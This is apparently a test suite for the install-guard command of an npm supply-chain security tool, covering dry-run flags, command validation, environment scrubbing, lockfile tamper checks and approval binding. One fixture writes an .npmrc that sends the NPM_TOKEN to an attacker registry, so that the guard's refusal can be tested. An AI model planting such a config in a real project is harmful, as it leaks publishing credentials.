import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { spawnSync } from 'node:child_process';
import {
  buildGuardEnvelope,
  assertSafeProjectFile,
  dryRunFlags,
  evaluateGuardResults,
  guardJsonDecision,
  guardTextDecision,
  guardNpmEnvironment,
  requestedNamesFromArgs,
  restoreProjectSnapshotIfUnchanged,
  resolveTrustedNpmCli,
  validateGuardCommand,
  validateArtifactSet,
  verifyLockfileDiff,
  verifyInstalledVersions,
  verifyProjectSnapshot,
  writeOwnedProjectFile,
} from '../src/commands/guard.js';
import { SCHEMA_VERSION } from '../src/cli/schema.js';
import { EXIT } from '../src/core/constants.js';

describe('guard dry-run flags (manager-correct)', () => {
  it('maps each package manager to its lockfile-only flag set', () => {
    assert.deepEqual(dryRunFlags('npm'), ['--package-lock-only', '--ignore-scripts']);
    assert.deepEqual(dryRunFlags('pnpm'), ['--lockfile-only', '--ignore-scripts']);
    assert.deepEqual(dryRunFlags('yarn'), ['--mode=update-lockfile', '--ignore-scripts', '--non-interactive']);
    assert.deepEqual(dryRunFlags('something-else'), dryRunFlags('npm'));
  });

  it('never includes a flag that would execute install scripts', () => {
    for (const m of ['npm', 'pnpm', 'yarn']) {
      assert.ok(dryRunFlags(m).includes('--ignore-scripts'), `${m} must ignore scripts`);
    }
  });

  it('refuses npx outright — no dry-run mode means the package would execute before analysis', async () => {
    // runGuard returns EXIT.ERROR before any execution when manager is npx.
    // No lockfile is needed: the refusal happens before lockfile checks.
    const { runGuard } = await import('../src/commands/guard.js');
    const EXIT = (await import('../src/core/constants.js')).EXIT;
    const rc = await runGuard({ force: false }, ['npx', 'some-package']);
    assert.equal(rc, EXIT.ERROR);
  });
});

describe('requestedNamesFromArgs', () => {
  it('pulls package names out of manager install args', () => {
    assert.deepEqual(requestedNamesFromArgs(['npm', 'install', 'lodash@^4.17.21', '-D']), ['lodash']);
    assert.deepEqual(requestedNamesFromArgs(['pnpm', 'i', 'left-pad', 'rimraf@3']), []);
    assert.deepEqual(requestedNamesFromArgs(['npm', 'install', '@scope/pkg@1.2.3']), ['@scope/pkg']);
    assert.deepEqual(requestedNamesFromArgs(['npm', 'install', '@scope/pkg']), ['@scope/pkg']);
    assert.deepEqual(requestedNamesFromArgs(['yarn', 'add', 'foo']), []);
  });

  it('ignores flags, local paths, and the current-dir target', () => {
    assert.deepEqual(requestedNamesFromArgs(['npm', 'install']), []);
    assert.deepEqual(requestedNamesFromArgs(['npm', 'install', './', '-D']), []);
    assert.deepEqual(requestedNamesFromArgs(['npm', 'install', '../vendor/x', '--save-dev']), []);
    assert.deepEqual(requestedNamesFromArgs(['npm', 'run', 'build']), []);
    assert.deepEqual(requestedNamesFromArgs([]), []);
  });
});

describe('guard command boundary', () => {
  it('accepts explicit public registry installs with a narrow flag set', () => {
    const v = validateGuardCommand(['npm', 'install', '@scope/pkg@1.2.3', 'lodash@^4', '--save-dev']);
    assert.equal(v.ok, true);
    assert.deepEqual(v.requestedNames, ['@scope/pkg', 'lodash']);
  });

  it('refuses commands that redirect or escape the analyzed project', () => {
    for (const argv of [
      ['npm', 'install', 'x', '-g'],
      ['npm', 'install', 'x', '--prefix=/tmp/elsewhere'],
      ['npm', 'install', 'x', '--workspace=child'],
      ['npm', 'install', 'https://example.invalid/x.tgz'],
      ['npm', 'install', '../local-package'],
      ['npm', 'install', 'foo@/tmp/local-package'],
      ['npm', 'install', 'foo@../local-package'],
      ['npm', 'install', 'foo@user/repo'],
      ['npm', 'install'],
      ['npm', 'run', 'build'],
    ]) {
      assert.equal(validateGuardCommand(argv).ok, false, argv.join(' '));
    }
  });

  it('returns an error when the required install command is omitted', async () => {
    const { runGuard } = await import('../src/commands/guard.js');
    assert.equal(await runGuard({ force: false }, []), EXIT.ERROR);
  });
});

describe('guard process and filesystem boundary', () => {
  it('builds an npm environment without inherited credentials or project PATH shims', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vexes-guard-env-'));
    try {
      const env = guardNpmEnvironment(dir);
      assert.equal(env.npm_config_registry, 'https://registry.npmjs.org/');
      assert.equal(env.NPM_TOKEN, undefined);
      assert.equal(env.NODE_OPTIONS, undefined);
      assert.equal(env.npm_config_ignore_scripts, 'true');
      assert.doesNotMatch(env.PATH, /node_modules[/\\]\.bin/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('resolves npm independently of a project-local PATH shim', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vexes-guard-npm-cli-'));
    try {
      const binDir = join(dir, 'node_modules', '.bin');
      mkdirSync(binDir, { recursive: true });
      const shim = join(binDir, 'npm');
      writeFileSync(shim, '#!/bin/sh\nexit 99\n', { mode: 0o755 });
      const cli = resolveTrustedNpmCli(dir);
      assert.notEqual(cli, shim);
      assert.equal(cli.startsWith(dir), false);
      assert.match(cli, /npm-cli\.js$/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('refuses symlinked project control files', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vexes-guard-symlink-'));
    const outside = join(dir, 'outside.json');
    const project = join(dir, 'project');
    mkdirSync(project);
    writeFileSync(outside, '{}\n');
    symlinkSync(outside, join(project, 'package.json'));
    try {
      assert.throws(
        () => assertSafeProjectFile(join(project, 'package.json'), project, 'package.json'),
        /symbolic link/,
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('refuses an active project .npmrc before resolution', async () => {
    const { runGuard } = await import('../src/commands/guard.js');
    const dir = mkdtempSync(join(tmpdir(), 'vexes-guard-npmrc-'));
    try {
      writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'project', version: '1.0.0' }));
      writeFileSync(join(dir, 'package-lock.json'), JSON.stringify({
        name: 'project', version: '1.0.0', lockfileVersion: 3,
        packages: { '': { name: 'project', version: '1.0.0' } },
      }));
      writeFileSync(join(dir, '.npmrc'), 'registry=https://attacker.invalid/\n//attacker.invalid/:_authToken=${NPM_TOKEN}\n');
      assert.equal(
        await runGuard({ path: dir, force: false }, ['npm', 'install', 'left-pad@1.3.0']),
        EXIT.ERROR,
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

// Fixtures: a tiny npm-style graph. `lodash` is what the install asked for;
// it depends on `is-number`. Anything else in the diff is suspicious.
const BEFORE = {
  name: 'proj', lockfileVersion: 3,
  packages: {
    '': { name: 'proj', dependencies: { lodash: '^4.17.21' } },
    'node_modules/lodash': { version: '4.17.20', dependencies: { 'is-number': '^7.0.0' } },
    'node_modules/is-number': { version: '7.0.0' },
  },
};
const AFTER = {
  name: 'proj', lockfileVersion: 3,
  packages: {
    '': { name: 'proj', dependencies: { lodash: '^4.17.21' } },
    'node_modules/lodash': { version: '4.17.21', dependencies: { 'is-number': '^7.0.0' } },
    'node_modules/is-number': { version: '7.0.0' },
    'node_modules/malicious': { version: '1.0.0', dependencies: { 'is-number': '^7.0.0' } },
  },
};

describe('guard lockfile tamper check (verifyLockfileDiff)', () => {
  it('passes when the diff is reachable from the requested install', () => {
    const diff = {
      added: [{ name: 'is-number', version: '7.0.0', ecosystem: 'npm' }],
      changed: [{ name: 'lodash', fromVersion: '4.17.20', toVersion: '4.17.21', ecosystem: 'npm' }],
      removed: [],
    };
    const reason = verifyLockfileDiff({
      beforeRaw: JSON.stringify(BEFORE),
      afterRaw: JSON.stringify(AFTER),
      diff,
      requestedNames: ['lodash'],
    });
    assert.equal(reason, null, JSON.stringify(reason));
  });

  it('flags an added package nobody asked for', () => {
    const reason = verifyLockfileDiff({
      beforeRaw: JSON.stringify(BEFORE),
      afterRaw: JSON.stringify(AFTER),
      diff: { added: [{ name: 'malicious' }], changed: [], removed: [] },
      requestedNames: ['lodash'],
    });
    assert.match(String(reason), /added package "malicious"/);
  });

  it('flags a changed package outside the requested reach', () => {
    const reason = verifyLockfileDiff({
      beforeRaw: JSON.stringify(BEFORE),
      afterRaw: JSON.stringify(AFTER),
      diff: { added: [], changed: [{ name: 'zig', toVersion: '2.0.0' }], removed: [] },
      requestedNames: ['lodash'],
    });
    assert.match(String(reason), /changed package "zig"/);
  });

  it('flags a removed package that was never reachable in the before graph', () => {
    const reason = verifyLockfileDiff({
      beforeRaw: JSON.stringify(BEFORE),
      afterRaw: JSON.stringify(AFTER),
      diff: { added: [], changed: [], removed: [{ name: 'left-pad' }] },
      requestedNames: ['lodash'],
    });
    assert.match(String(reason), /removed package "left-pad"/);
  });

  it('allows removing a package the requested install sat on (dedupe/evict)', () => {
    const reason = verifyLockfileDiff({
      beforeRaw: JSON.stringify(BEFORE),
      afterRaw: JSON.stringify(AFTER),
      diff: { added: [], changed: [], removed: [{ name: 'is-number' }] },
      requestedNames: ['lodash'],
    });
    assert.equal(reason, null, JSON.stringify(reason));
  });

  it('skips attribution when no requested names are given', () => {
    const reason = verifyLockfileDiff({
      beforeRaw: 'garbage',
      afterRaw: 'garbage',
      diff: { added: [{ name: 'anything@^9' }], changed: [], removed: [] },
      requestedNames: [],
    });
    assert.equal(reason, null);
  });
});

describe('guard JSON envelope (buildGuardEnvelope)', () => {
  it('emits the schema envelope and keeps guard-specific fields', () => {
    const diff = { added: [{ name: 'x' }], changed: [], removed: [] };
    const payload = buildGuardEnvelope({
      installCommand: 'npm install x',
      diff,
      blocked: true,
      incomplete: false,
      warnings: ['w1'],
      results: [{ name: 'x', riskLevel: 'CRITICAL' }],
    });
    assert.equal(payload.schemaVersion, SCHEMA_VERSION);
    assert.equal(payload.generator.name, 'vexes');
    assert.equal(payload.command, 'guard');
    assert.equal(payload.complete, true, 'not incomplete ⇒ complete stays true');
    assert.deepEqual(payload.warnings, ['w1']);
    assert.deepEqual(payload.summary, { added: 1, changed: 0, removed: 0, blocked: true, incomplete: false });
    // guard-specific field remained a top-level key for old consumers
    assert.deepEqual(payload.results, [{ name: 'x', riskLevel: 'CRITICAL' }]);
    assert.equal(payload.blocked, true);
    assert.equal(payload.installCommand, 'npm install x');
    assert.deepEqual(payload.diff, { added: 1, changed: 0, removed: 0 });
  });

  it('reports incomplete scans as complete:false (fail loud)', () => {
    const payload = buildGuardEnvelope({
      installCommand: 'npm install y', diff: { added: [], changed: [], removed: [] },
      blocked: false, incomplete: true, warnings: [], results: [],
    });
    assert.equal(payload.complete, false);
    assert.equal(payload.result.complete, false);
  });
});

describe('guard JSON fail-loud boundary', () => {
  it('emits complete:false envelopes and exit 2 for early command errors', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vexes-guard-json-'));
    try {
      const cases = [
        { label: 'missing command', argv: ['guard', '--json', '--path', dir] },
        { label: 'invalid command', argv: ['guard', '--json', '--path', dir, '--', 'npx', 'x'] },
        { label: 'missing project files', argv: ['guard', '--json', '--path', dir, '--', 'npm', 'install', 'x'] },
        { label: 'missing path', argv: ['guard', '--json', '--path', join(dir, 'gone'), '--', 'npm', 'install', 'x'] },
      ];

      for (const testCase of cases) {
        const child = spawnSync(process.execPath, ['bin/vexes.js', ...testCase.argv], {
          cwd: process.cwd(),
          encoding: 'utf8',
        });
        assert.equal(child.status, EXIT.ERROR, `${testCase.label}: ${child.stderr}`);
        const payload = JSON.parse(child.stdout);
        assert.equal(payload.command, 'guard', testCase.label);
        assert.equal(payload.complete, false, testCase.label);
        assert.equal(payload.blocked, true, testCase.label);
        assert.ok(payload.warnings.length > 0, testCase.label);
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('guard OSV decision boundary', () => {
  it('blocks on nonempty OSV results even when advisory signals were disabled', () => {
    const decision = evaluateGuardResults([
      { name: 'vulnerable', version: '1.0.0', riskLevel: 'NONE', signals: [] },
    ], {
      results: new Map([['npm:vulnerable@1.0.0', [{ id: 'GHSA-known' }]]]),
      failures: [],
      failedCount: 0,
      queriedCount: 1,
      checked: new Set(['npm:vulnerable@1.0.0']),
    }, 1);

    assert.equal(decision.hasKnownVulns, true);
    assert.equal(decision.analysisIncomplete, false);
    assert.equal(decision.critical.length, 0, 'the independent OSV block does not require an emitted signal');
  });

  it('does not treat checked empty OSV arrays as vulnerabilities', () => {
    const decision = evaluateGuardResults([
      { name: 'clean', version: '1.0.0', riskLevel: 'NONE', signals: [] },
    ], {
      results: new Map([['npm:clean@1.0.0', []]]),
      failures: [], failedCount: 0, queriedCount: 1,
      checked: new Set(['npm:clean@1.0.0']),
    }, 1);
    assert.equal(decision.hasKnownVulns, false);
  });

  it('elevates downweighted raw HIGH evidence and allows only explicit text --force', () => {
    const decision = evaluateGuardResults([
      {
        name: 'diluted', version: '1.0.0', riskLevel: 'LOW',
        signals: [{ signal: 'DANGEROUS', severity: 'HIGH', description: 'raw evidence' }],
      },
    ], {
      results: new Map([['npm:diluted@1.0.0', []]]),
      failures: [], failedCount: 0, queriedCount: 1,
      checked: new Set(['npm:diluted@1.0.0']),
    }, 1);

    assert.equal(decision.rawHigh.length, 1);
    assert.equal(decision.high.length, 1);
    assert.equal(decision.critical.length, 0);
    assert.equal(guardJsonDecision(decision).blocked, true);
    assert.equal(guardJsonDecision(decision).exitCode, EXIT.VULNS_FOUND);
    assert.deepEqual(
      guardTextDecision(decision, { forceInstall: true, interactive: false }),
      { action: 'install', exitCode: null },
    );
    assert.deepEqual(
      guardTextDecision(decision, { forceInstall: false, interactive: false }),
      { action: 'block', exitCode: EXIT.VULNS_FOUND },
    );
  });

  it('makes downweighted raw CRITICAL evidence non-overridable', () => {
    const decision = evaluateGuardResults([
      {
        name: 'critical', version: '1.0.0', riskLevel: 'LOW',
        signals: [{ signal: 'CODE_EXECUTION', severity: 'CRITICAL', description: 'raw evidence' }],
      },
    ], {
      results: new Map([['npm:critical@1.0.0', []]]),
      failures: [], failedCount: 0, queriedCount: 1,
      checked: new Set(['npm:critical@1.0.0']),
    }, 1);

    assert.equal(decision.rawCritical.length, 1);
    assert.equal(decision.critical.length, 1);
    assert.equal(decision.high.length, 0);
    assert.deepEqual(
      guardTextDecision(decision, { forceInstall: true, interactive: false }),
      { action: 'block', exitCode: EXIT.VULNS_FOUND },
    );
    assert.deepEqual(guardJsonDecision(decision), { blocked: true, exitCode: EXIT.VULNS_FOUND });
  });

  it('treats analysis warnings as incomplete and non-approvable', () => {
    const decision = evaluateGuardResults([
      {
        name: 'partially-checked', version: '1.0.0', occurrence: 'node_modules/partially-checked',
        riskLevel: 'NONE', signals: [], warnings: ['tarball inspection was bounded'],
      },
    ], {
      results: new Map([['npm:partially-checked@1.0.0', []]]),
      failures: [], failedCount: 0, queriedCount: 1,
      checked: new Set(['npm:partially-checked@1.0.0']),
    }, 1);

    assert.equal(decision.analysisIncomplete, true);
    assert.match(decision.incompleteReasons.join(' '), /tarball inspection was bounded/);
    assert.deepEqual(guardJsonDecision(decision), { blocked: true, exitCode: EXIT.ERROR });
  });

  it('blocks a complete composite HIGH result in non-interactive JSON mode', () => {
    const decision = evaluateGuardResults([
      { name: 'high', version: '1.0.0', riskLevel: 'HIGH', signals: [] },
    ], {
      results: new Map([['npm:high@1.0.0', []]]),
      failures: [], failedCount: 0, queriedCount: 1,
      checked: new Set(['npm:high@1.0.0']),
    }, 1);
    assert.deepEqual(guardJsonDecision(decision), { blocked: true, exitCode: EXIT.VULNS_FOUND });
  });

  it('gives incomplete coverage exit 2 precedence while preserving the security block', () => {
    const decision = evaluateGuardResults([
      { name: 'known', version: '1.0.0', riskLevel: 'CRITICAL', signals: [] },
      { name: 'unchecked', version: '2.0.0', riskLevel: 'UNKNOWN', signals: [], warnings: ['metadata unavailable'] },
    ], {
      results: new Map([['npm:known@1.0.0', [{ id: 'GHSA-known' }]]]),
      failures: ['OSV partial response'], failedCount: 1, queriedCount: 1,
      checked: new Set(['npm:known@1.0.0']),
    }, 2);

    assert.equal(decision.hasKnownVulns, true);
    assert.equal(decision.analysisIncomplete, true);
    assert.deepEqual(guardJsonDecision(decision), { blocked: true, exitCode: EXIT.ERROR });
    assert.deepEqual(
      guardTextDecision(decision, { forceInstall: true, interactive: false }),
      { action: 'block', exitCode: EXIT.ERROR },
    );
  });
});

describe('guard project snapshot ownership', () => {
  it('atomically replaces only the exact reviewed bytes', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vexes-guard-atomic-'));
    const packagePath = join(dir, 'package.json');
    const original = '{"name":"original"}\n';
    const proposed = '{"name":"proposed"}\n';
    try {
      writeFileSync(packagePath, original);
      const identity = assertSafeProjectFile(packagePath, dir, 'package.json');
      writeOwnedProjectFile(packagePath, proposed, identity, 'package.json', original);
      assert.equal(readFileSync(packagePath, 'utf8'), proposed);

      const nextIdentity = assertSafeProjectFile(packagePath, dir, 'package.json');
      assert.throws(
        () => writeOwnedProjectFile(packagePath, original, nextIdentity, 'package.json', 'stale bytes\n'),
        /bytes changed before commit/,
      );
      assert.equal(readFileSync(packagePath, 'utf8'), proposed);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('detects project edits made after the original review snapshot', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vexes-guard-snapshot-'));
    const packagePath = join(dir, 'package.json');
    const lockfilePath = join(dir, 'package-lock.json');
    const packageRaw = '{"name":"project"}\n';
    const lockRaw = '{"lockfileVersion":3,"packages":{}}\n';
    try {
      writeFileSync(packagePath, packageRaw);
      writeFileSync(lockfilePath, lockRaw);
      assert.deepEqual(verifyProjectSnapshot({
        packagePath, lockfilePath,
        expectedPackageRaw: packageRaw,
        expectedLockfileRaw: lockRaw,
      }), { ok: true });

      writeFileSync(packagePath, '{"name":"concurrent-edit"}\n');
      const verdict = verifyProjectSnapshot({
        packagePath, lockfilePath,
        expectedPackageRaw: packageRaw,
        expectedLockfileRaw: lockRaw,
      });
      assert.equal(verdict.ok, false);
      assert.match(verdict.reason, /package\.json changed/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('never overwrites concurrent edits with stale rollback bytes', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vexes-guard-rollback-'));
    const packagePath = join(dir, 'package.json');
    const lockfilePath = join(dir, 'package-lock.json');
    const originalPackageRaw = '{"name":"original"}\n';
    const originalLockfileRaw = '{"state":"original"}\n';
    const proposedPackageRaw = '{"name":"proposed"}\n';
    const proposedLockfileRaw = '{"state":"proposed"}\n';
    const concurrentLockRaw = '{"state":"concurrent"}\n';
    try {
      writeFileSync(packagePath, proposedPackageRaw);
      writeFileSync(lockfilePath, concurrentLockRaw);
      const verdict = restoreProjectSnapshotIfUnchanged({
        packagePath, lockfilePath,
        expectedPackageRaw: proposedPackageRaw,
        expectedLockfileRaw: proposedLockfileRaw,
        originalPackageRaw,
        originalLockfileRaw,
      });

      assert.equal(verdict.restored, false);
      assert.equal(verdict.files.packageJson.status, 'restored');
      assert.equal(verdict.files.packageLock.status, 'preserved');
      assert.equal(readFileSync(packagePath, 'utf8'), originalPackageRaw);
      assert.equal(readFileSync(lockfilePath, 'utf8'), concurrentLockRaw);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('restores the staged manifest when the second staging write fails', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vexes-guard-partial-stage-'));
    const packagePath = join(dir, 'package.json');
    const lockfilePath = join(dir, 'package-lock.json');
    const originalPackageRaw = '{"name":"original"}\n';
    const originalLockfileRaw = '{"state":"original"}\n';
    const proposedPackageRaw = '{"name":"proposed"}\n';
    const proposedLockfileRaw = '{"state":"proposed"}\n';
    try {
      // This is the on-disk state after package.json staging succeeded but the
      // subsequent package-lock.json write threw before changing its bytes.
      writeFileSync(packagePath, proposedPackageRaw);
      writeFileSync(lockfilePath, originalLockfileRaw);
      const verdict = restoreProjectSnapshotIfUnchanged({
        packagePath, lockfilePath,
        expectedPackageRaw: proposedPackageRaw,
        expectedLockfileRaw: proposedLockfileRaw,
        originalPackageRaw,
        originalLockfileRaw,
      });

      assert.equal(verdict.restored, true);
      assert.equal(verdict.files.packageJson.status, 'restored');
      assert.equal(verdict.files.packageLock.status, 'already-original');
      assert.equal(readFileSync(packagePath, 'utf8'), originalPackageRaw);
      assert.equal(readFileSync(lockfilePath, 'utf8'), originalLockfileRaw);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('verifyInstalledVersions (approval binds to the installed artifact)', () => {
  const lock = (packages) => JSON.stringify({ name: 'proj', lockfileVersion: 3, packages });

  it('accepts when every analyzed package is installed at the exact approved version', () => {
    const verdict = verifyInstalledVersions({
      afterRaw: lock({
        'node_modules/lodash': { version: '4.17.21' },
        'node_modules/left-pad': { version: '1.3.0' },
      }),
      expected: [
        { name: 'lodash', version: '4.17.21', occurrence: 'node_modules/lodash' },
        { name: 'left-pad', version: '1.3.0', occurrence: 'node_modules/left-pad' },
      ],
    });
    assert.deepEqual(verdict, { ok: true });
  });

  it('rejects a version drift between the second resolution and the analyzed one', () => {
    const verdict = verifyInstalledVersions({
      afterRaw: lock({ 'node_modules/lodash': { version: '4.17.22' } }),
      expected: [{ name: 'lodash', version: '4.17.21', occurrence: 'node_modules/lodash' }],
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /approved as lodash@4\.17\.21 but installed as 4\.17\.22/);
  });

  it('rejects an approved package that vanished in the real install', () => {
    const verdict = verifyInstalledVersions({
      afterRaw: lock({ 'node_modules/other': { version: '1.0.0' } }),
      expected: [{ name: 'lodash', version: '4.17.21', occurrence: 'node_modules/lodash' }],
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /missing at node_modules\/lodash/);
  });

  it('does not let a nested occurrence satisfy approval for a different path', () => {
    const verdict = verifyInstalledVersions({
      afterRaw: lock({
        'node_modules/a/node_modules/lodash': { version: '3.10.1' },
        'node_modules/lodash': { version: '4.17.21' },
      }),
      expected: [{ name: 'lodash', version: '3.10.1', occurrence: 'node_modules/lodash' }],
    });
    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /node_modules\/lodash approved/);
  });

  it('requires occurrence identity and fails loud on an empty/missing lockfile', () => {
    const ok = verifyInstalledVersions({
      afterRaw: lock({ 'node_modules/lodash': { version: '4.17.21' } }),
      expected: [{ name: 'lodash', version: '4.17.21', occurrence: 'node_modules/lodash' }],
    });
    assert.deepEqual(ok, { ok: true });

    const unbound = verifyInstalledVersions({ afterRaw: lock({}), expected: [{ name: 'lodash', version: '4.17.21' }] });
    assert.equal(unbound.ok, false);
    assert.match(unbound.reason, /lacks a lockfile occurrence/);

    const bad = verifyInstalledVersions({ afterRaw: '', expected: [{ name: 'lodash', version: '4.17.21', occurrence: 'node_modules/lodash' }] });
    assert.equal(bad.ok, false);
  });

  it('binds resolved URL and integrity at the exact occurrence', () => {
    const expected = [{
      name: 'lodash', version: '4.17.21', occurrence: 'node_modules/lodash',
      resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz', integrity: 'sha512-approved',
    }];
    const good = verifyInstalledVersions({
      afterRaw: lock({ 'node_modules/lodash': { version: '4.17.21', resolved: expected[0].resolved, integrity: expected[0].integrity } }),
      expected,
    });
    assert.deepEqual(good, { ok: true });

    const bad = verifyInstalledVersions({
      afterRaw: lock({ 'node_modules/lodash': { version: '4.17.21', resolved: expected[0].resolved, integrity: 'sha512-other' } }),
      expected,
    });
    assert.equal(bad.ok, false);
    assert.match(bad.reason, /integrity differs/);
  });

  it('rejects an unexpected post-install lockfile occurrence', () => {
    const approvedPackages = {
      '': { name: 'proj' },
      'node_modules/lodash': { version: '4.17.21' },
    };
    const verdict = verifyInstalledVersions({
      approvedRaw: lock(approvedPackages),
      afterRaw: lock({
        ...approvedPackages,
        'node_modules/lodash/node_modules/unreviewed': { version: '1.0.0' },
      }),
      expected: [{ name: 'lodash', version: '4.17.21', occurrence: 'node_modules/lodash' }],
    });

    assert.equal(verdict.ok, false);
    assert.match(verdict.reason, /unexpected lockfile occurrence node_modules\/lodash\/node_modules\/unreviewed/);
  });

  it('rejects disappearance or artifact drift in an approved unchanged occurrence', () => {
    const approvedPackages = {
      '': { name: 'proj' },
      'node_modules/new': {
        version: '2.0.0', resolved: 'https://registry.npmjs.org/new/-/new-2.0.0.tgz', integrity: 'sha512-new',
      },
      'node_modules/unchanged': {
        version: '1.0.0', resolved: 'https://registry.npmjs.org/unchanged/-/unchanged-1.0.0.tgz', integrity: 'sha512-old',
      },
    };
    const expected = [{
      name: 'new', version: '2.0.0', occurrence: 'node_modules/new',
      resolved: approvedPackages['node_modules/new'].resolved,
      integrity: approvedPackages['node_modules/new'].integrity,
    }];

    const missing = verifyInstalledVersions({
      approvedRaw: lock(approvedPackages),
      afterRaw: lock({ '': approvedPackages[''], 'node_modules/new': approvedPackages['node_modules/new'] }),
      expected,
    });
    assert.equal(missing.ok, false);
    assert.match(missing.reason, /unchanged disappeared/);

    const drifted = verifyInstalledVersions({
      approvedRaw: lock(approvedPackages),
      afterRaw: lock({
        ...approvedPackages,
        'node_modules/unchanged': { ...approvedPackages['node_modules/unchanged'], integrity: 'sha512-replaced' },
      }),
      expected,
    });
    assert.equal(drifted.ok, false);
    assert.match(drifted.reason, /unchanged integrity differs/);
  });
});

describe('validateArtifactSet', () => {
  it('accepts bindable public npm artifacts and refuses missing/alternate sources', () => {
    const good = validateArtifactSet([{
      name: 'x', version: '1.0.0', occurrence: 'node_modules/x',
      integrity: 'sha512-abc', resolved: 'https://registry.npmjs.org/x/-/x-1.0.0.tgz',
    }]);
    assert.equal(good.ok, true);

    const bad = validateArtifactSet([{
      name: 'x', version: '1.0.0', occurrence: 'node_modules/x',
      resolved: 'https://mirror.example/x.tgz',
    }]);
    assert.equal(bad.ok, false);
    assert.match(bad.reasons.join(' '), /integrity|outside/);
  });
});
